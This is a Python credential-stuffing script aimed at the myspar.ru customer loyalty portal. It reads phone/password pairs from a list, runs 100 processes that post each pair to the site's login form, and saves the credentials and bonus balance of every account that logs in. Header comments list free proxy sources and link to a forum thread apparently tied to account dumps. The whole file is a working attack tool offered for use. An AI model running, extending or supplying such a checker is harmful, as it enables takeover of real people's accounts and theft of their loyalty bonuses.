# Proxy

# https://proxyscrape.com/online-proxy-checker

# https://www.proxy-list.download/api/v1/get?type=http&country=UA
# http://pubproxy.com/api/proxy?type=http&last_check=5&limit=5&country=us
# https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=us&ssl=all&anonymity=all
# https://proxyline.net/besplatnye-onlajn-proksi-servera/
# https://free-proxy-list.net/
# https://freeproxylists.net/ru/
# https://spys.one/proxys/



# ----------------------------------------------------------------------------

# Accounts
# https://zelenka.guru/threads/1631724/

import requests
from multiprocessing import Process, Queue, Value
import re
import sys




def checkValid(queue):
    while(queue.empty() == False):
        try:
            line = queue.get()[:-1]
            if ':' in line:
                c = line.split(':')
            if ';' in line:
                c = line.split(';')

            user_login = c[0]
            user_pass = c[1]
            data = {'AUTH_FORM': 'Y', 'TYPE': 'AUTH', 'backurl': '/personal/', "USER_LOGIN": user_login,
                    'username': user_login,
                    'USER_PASSWORD': user_pass, 'USER_REMEMBER': 'Y', 'Login': 'Y'}
            s = requests.Session()
            s.get("https://myspar.ru/personal/")
            resp = s.post("https://myspar.ru/personal/?login=yes", data=data)
            try:
                bonuses = re.search('<span class="header-control__text-desc">.*</span>', resp.text)
                bonuses = re.search(">.*<", bonuses.group(0))
                bonuses = bonuses.group(0)
                file = open("checked.txt", "a")
                file.write("Phone: " + str(user_login) + "\nPassword: " + str(user_pass) + "\nBonuses: " + str(
                    bonuses[1:-1] + "\n\n\n"))
                file.close()
                s.close()
            except:
                s.close()
                continue
        except:
            continue

def createProc(queue, count):
    for i in range(0, count):
        proc = Process(target=checkValid, args=(queue,))
        proc.start()
    queue.close()

if __name__ == "__main__":
    count = 100
    queue = Queue()
    with open("baza.txt", "r", encoding="utf-8") as fileToCHeck:
        for line in fileToCHeck.readlines():
            queue.put(line)
            print(line+"\r")
    fileToCHeck.close()
    createProc(queue, count)
    print("Запускается", count," потоков")




